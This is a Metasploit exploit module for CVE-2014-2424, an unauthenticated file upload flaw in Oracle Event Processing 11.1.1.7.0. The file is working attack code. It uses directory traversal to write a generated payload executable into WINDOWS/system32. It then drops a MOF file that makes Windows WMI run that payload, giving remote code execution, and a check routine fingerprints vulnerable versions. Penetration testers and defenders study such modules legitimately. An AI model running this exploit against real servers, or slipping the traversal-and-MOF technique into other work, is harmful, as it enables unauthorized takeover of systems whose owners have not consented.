# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Oracle Event Processing FileUploadServlet Arbitrary File Upload&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an Arbitrary File Upload vulnerability in Oracle Event Processing
        11.1.1.7.0. The FileUploadServlet component, which requires no authentication, can be
        abused to upload a malicious file onto an arbitrary location due to a directory traversal
        flaw, and compromise the server. By default Oracle Event Processing uses a Jetty
        Application Server without JSP support, which limits the attack to WbemExec. The current
        WbemExec technique only requires arbitrary write to the file system, but at the moment the
        module only supports Windows 2003 SP2 or older.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;rgod <rgod[at]autistici.org>&#039;, # Vulnerability Discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-2424&#039;],
          [&#039;ZDI&#039;, &#039;14-106&#039;],
          [&#039;BID&#039;, &#039;66871&#039;],
          [&#039;URL&#039;, &#039;http://www.oracle.com/technetwork/topics/security/cpuapr2014-1972952.html&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039; => 5
        },
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 2048
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Targets&#039;        =>
        [
          [&#039;Oracle Event Processing 11.1.1.7.0 / Windows 2003 SP2 through WMI&#039;, {}]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Apr 21 2014&#039;))

    register_options(
      [
        Opt::RPORT(9002),
        # By default, uploads are stored in:
        # C:\Oracle\Middleware\user_projects\domains\<DOMAIN>\defaultserver\upload\
        OptInt.new(&#039;DEPTH&#039;, [true, &#039;Traversal depth&#039;, 7])
      ], self.class)
  end

  def upload(file_name, contents)
    post_data = Rex::MIME::Message.new
    post_data.add_part(rand_text_alpha(4 + rand(4)), nil, nil, "form-data; name=\"Filename\"")
    post_data.add_part(contents, "application/octet-stream", "binary", "form-data; name=\"uploadfile\"; filename=\"#{file_name}\"")
    data = post_data.to_s

    res = send_request_cgi({
      &#039;uri&#039;    => &#039;/wlevs/visualizer/upload&#039;,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;data&#039;   => data
    })

    res
  end

  def traversal
    "../" * datastore[&#039;DEPTH&#039;]
  end

  def exploit
    print_status("#{peer} - Generating payload and mof file...")
    mof_name = "#{rand_text_alpha(rand(5)+5)}.mof"
    exe_name = "#{rand_text_alpha(rand(5)+5)}.exe"
    exe_content = generate_payload_exe
    mof_content = generate_mof(mof_name, exe_name)

    print_status("#{peer} - Uploading the exe payload #{exe_name}...")
    exe_traversal = "#{traversal}WINDOWS/system32/#{exe_name}"
    res = upload(exe_traversal, exe_content)

    unless res && res.code == 200 && res.body.blank?
      print_error("#{peer} - Unexpected answer, trying anyway...")
    end
    register_file_for_cleanup(exe_name)

    print_status("#{peer} - Uploading the MOF file #{mof_name}")
    mof_traversal = "#{traversal}WINDOWS/system32/wbem/mof/#{mof_name}"
    upload(mof_traversal, mof_content)
    register_file_for_cleanup("wbem/mof/good/#{mof_name}")
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039;    => &#039;/ohw/help/state&#039;,
      &#039;method&#039; => &#039;GET&#039;,
      &#039;vars_get&#039;  => {
        &#039;navSetId&#039; => &#039;cepvi&#039;,
        &#039;navId&#039; => &#039;0&#039;,
        &#039;destination&#039; => &#039;&#039;
      }
    })

    if res && res.code == 200
      if res.body.to_s.include?("Oracle Event Processing 11g Release 1 (11.1.1.7.0)")
        return Exploit::CheckCode::Detected
      elsif res.body.to_s.include?("Oracle Event Processing 12")
        return Exploit::CheckCode::Safe
      end
    end

    Exploit::CheckCode::Unknown
  end

end

